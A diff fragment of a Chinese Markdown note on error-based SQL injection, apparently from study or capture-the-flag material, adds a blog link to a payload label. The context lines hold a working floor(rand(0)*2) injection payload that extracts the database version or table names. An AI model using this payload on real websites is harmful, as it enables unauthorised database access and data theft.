@@ -20,7 +20,7 @@
 ![](/assets/F959A1FB7211CB335A3944DE5CBA4FF1.png)
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法: 经典报错函数（结合Burpsuite快速获取内容）
 ![](/assets/2DA57441F54D5F917232F998ACD62900.png)
-####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload: floor()
+####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload: [floor()](https://blog.csdn.net/liangdongjuan/article/details/78406395)
 ```sql
 and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2))) %23
 select version()可替换 select table_name from information_schema.tables where table_schema=database() limit 0,1
